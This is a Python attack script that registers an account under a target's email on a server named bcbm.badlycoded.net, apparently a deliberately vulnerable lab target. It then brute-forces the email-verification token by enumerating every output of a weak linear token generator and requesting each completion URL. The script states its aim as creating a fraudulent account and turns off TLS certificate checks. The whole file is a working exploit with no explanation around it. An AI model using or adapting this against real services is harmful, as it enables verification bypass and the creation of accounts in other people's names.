import base64, struct, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

email = "example@email.com"
password = "pw"
server = "https://bcbm.badlycoded.net"

a_lo, a_hi = 0xa982dc0f8191b361, 0x9f9194fe856a7ae3
b_lo, b_hi = 0x9df7ba137be9d751, 0xb97d747a9f948b03

print("Targeting example@email.com to create a fraudulent bcbm account")

try:
    r = requests.get(f"{server}/reg/{email}/{password}", verify=False, timeout=10)
    if r.status_code == 200:
        print("example@email.com registered")
    else:
        print("Registration failed")
except Exception as e:
    print(f"Registration error: {e}")

print("Starting token brute-force")
attempts = 0

for lo_seed in range(256):
    for hi_seed in range(256):
        t_lo = (a_lo * lo_seed + b_lo) & 0xFFFFFFFFFFFFFFFF
        t_hi = (a_hi * hi_seed + b_hi) & 0xFFFFFFFFFFFFFFFF
        raw = struct.pack('<QQ', t_lo, t_hi)
        token = base64.urlsafe_b64encode(raw).decode().rstrip('=')
        url = f"{server}/complete/{email}/{token}"
        attempts += 1

        if attempts % 100 == 0:
            percent = (attempts / 65536) * 100
            print(f"{attempts}/65536 tokens tried ({percent:.2f}%)")

        try:
            r = requests.get(url, verify=False, timeout=2)
            if r.status_code == 200:
                print(f"Found corresponding token: {token}")
                print(f"Seeds: t_lo_seed={lo_seed}, t_hi_seed={hi_seed}")
                exit(0)
        except:
            pass

print("No valid token found")
